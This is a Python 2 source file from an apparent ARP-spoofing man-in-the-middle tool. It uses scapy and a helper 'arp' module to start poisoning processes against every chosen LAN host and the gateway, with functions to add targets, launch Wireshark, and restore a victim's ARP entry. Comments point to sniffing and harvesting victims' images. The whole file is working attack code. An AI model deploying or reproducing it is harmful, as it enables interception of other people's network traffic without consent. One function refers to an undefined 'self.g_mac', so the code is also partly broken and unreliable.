import sys, os
import multiprocessing, subprocess

import arp

from scapy.all import *
from termcolor import colored


def exe_wireshak():
    os.system("wireshark &")

def exe_ifconfig():
    os.system("ifconfig")

def add_ip(ipaddr, g_ip, t_ip, id_map, thread_array, g_mac, t_mac, cfg, silent):
    macaddr = arp.get_mac(ipaddr)
    if ipaddr == g_ip:
        print colored("[!!] Ip is gateway skipping...", "red")
    elif macaddr == None:
        print colored("[!!] Mac addr is None skipping...", "red")
    else:
        t_ip.append(ipaddr)
        t_mac[ipaddr] = macaddr               # retrieving mac addrs
        if not silent:
            thread_array.append(multiprocessing.Process(target=arp.poison,\
                    args=(g_ip,self.g_mac, ipaddr, macaddr, cfg['RATE'])))
            thread_array[len(thread_array)-1].start()
            id_map[len(thread_array)-1] =\
                    [ipaddr, macaddr, None, None]
        print colored("[^] Added the ip %s => %s" % (ipaddr, macaddr),\
                "blue")

def start_arp(t_ip, thread_array, g_ip, g_mac, t_mac, cfg, id_map):
    t_id = 0
    for ip in t_ip:                    # start the arp on every client
        thread_array.append(multiprocessing.Process(target=arp.poison,\
        args=(g_ip, g_mac, ip, t_mac[ip], cfg['RATE'])))
        thread_array[t_id].start()
        id_map[t_id] = [ip, t_mac[ip], None , None]
        # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
        t_id += 1

def kill_instance(i, thread_array, g_ip, g_mac, id_map):
    thread_array[i].terminate()
    arp.restore_target(g_ip, g_mac, id_map[i][0], id_map[i][1])
    print colored("[^] Restored: %s" % id_map[i][0], "blue")
    del id_map[i]
